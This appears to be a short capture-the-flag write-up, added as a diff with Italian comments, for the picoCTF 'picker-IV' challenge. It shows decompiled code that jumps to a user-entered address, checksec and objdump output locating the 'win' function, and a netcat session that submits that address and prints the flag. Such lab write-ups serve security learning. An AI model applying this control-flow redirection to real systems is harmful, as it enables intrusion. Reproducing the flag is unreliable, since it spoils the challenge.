@@ -1,0 +1,44 @@
+00401334    int32_t main(int32_t argc, char** argv, char** envp)
+
+00401334    {
+00401334        signal(0xb, print_segf_message);
+0040136a        setvbuf(__TMC_END__, nullptr, 2, 0);
+0040137b        printf("Enter the address in hex to jump to, excluding '0x': ");
+00401393        int32_t var_14;
+00401393        __isoc99_scanf("%x", &var_14);
+004013a9        printf("You input 0x%x\n", (uint64_t)var_14);
+004013bb        ((uint64_t)var_14)();
+004013c3        return 0;
+00401334    }
+
+---- vedo che il programma esegue come funzione l'indirizzo che viene inserito dall'utente
+
+
+root@c348cfa66ca0:/app# checksec picker-IV
+[*] '/app/picker-IV'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+
+---- vedo che non c'è PIE attivo, ogni esec ha gli stessi indirizzi.
+
+
+root@c348cfa66ca0:/app# objdump -M intel -d picker-IV | grep win
+000000000040129e <win>:
+  4012d2:	75 16                	jne    4012ea <win+0x4c>
+  4012f9:	eb 1a                	jmp    401315 <win+0x77>
+  401319:	75 e0                	jne    4012fb <win+0x5d>
+
+---- 000000000040129e è l'indirizzo della funzione win
+
+
+nc saturn.picoctf.net 59848                                                                                                                                 ─╯
+Enter the address in hex to jump to, excluding '0x': 000000000040129e
+You input 0x40129e
+You won!
+picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_01672a61}
